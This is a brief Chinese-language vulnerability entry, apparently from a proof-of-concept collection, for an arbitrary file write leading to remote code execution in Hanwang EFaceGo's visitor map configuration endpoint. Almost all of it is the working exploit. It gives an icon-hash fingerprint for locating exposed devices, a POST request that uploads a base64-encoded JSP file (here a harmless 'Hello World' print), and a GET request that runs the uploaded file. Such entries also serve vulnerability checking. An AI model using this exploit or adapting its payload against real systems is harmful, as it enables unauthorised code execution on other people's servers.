# 汉王EFaceGoupdateVisitorMapConfig任意文件写入导致RCE漏洞

汉王EFaceGoupdateVisitorMapConfig任意文件写入 ｜ 命令执行 ｜ —
- **指纹**：`icon_hash="1380907357"`
- **请求**：`POST /manage/visitorMapConfig/updateVisitorMapConfig.do?recoToken=SGUsqvF7cVS HTTP/1.1`

**Payload**
```
"id": 1,
"mapName": "test",
"fileType": "jsp",
"updatedPhoto": "PCUgb3V0LnByaW50KCJIZWxsbyBXb3JsZCEiKTsgJT4="
GET /manage/resource/{updatedPhotoPath}.jsp HTTP/1.1
Host:
```
- **响应特征**：200